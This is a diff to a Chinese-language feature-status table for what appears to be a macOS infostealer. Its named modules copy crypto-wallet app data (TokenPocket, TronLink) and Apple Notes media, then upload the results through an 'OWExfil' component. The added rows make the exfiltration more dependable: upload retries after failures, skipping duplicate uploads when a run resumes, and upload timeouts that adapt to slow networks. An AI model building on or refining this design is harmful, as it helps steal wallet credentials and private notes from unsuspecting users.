@@ -584,6 +584,9 @@ B: TokenPocket 完成（0.1s）
 | **边车不重复拷** | `OWContainerPass` 定义文件分支 | 定义件里同时列了 `-wal/-shm` 时，交给边车自己那轮拷，主库不再重复带一遍 |
 | **Discovery 反查** | `OWContainerPass.run` + `OWLaunchServices` | 目标变体全查不到时，用 LaunchServices 的已安装列表按名字模糊反查（如 TronLink）；日志同时打印「钱包类候选 bundleId」便于校准 |
 | **备忘录图片** | `targets.plist` AppleNotes `includeMedia` + `Media` 路径 | 图片/附件不再被 heavy 规则跳过，也不受 2MB 宽松上限限制（受单目标 150MB 总量约束） |
+| **补传后重判收尾** | `OWUploaderDidDrainNotification` → `OWRoute._onPendingDrained` | 3 秒重试把 pending 清空后重新判定 done，不再卡 `phase=failed` 等用户重启 |
+| **续跑不重复上传** | `up_<target>` 标记 + `OWRoute._onUploadDone:` | 单目标包上传成功即记账，重启续跑跳过打包上传，避免服务端出现两份 |
+| **上传超时自适应** | `OWExfil._post` | `60 + size/20KB/s`，最少 60s、最多 300s；慢网 2.7MB 不再 60s 白超时 |
 | `hasPendingData` 含 manifest | `OWExfil.hasPendingData` | 只剩 manifest 没传也会续跑，不再残留到下一轮 |
 
 ### 14.2 部分实现 / 未实现 ⚠️❌
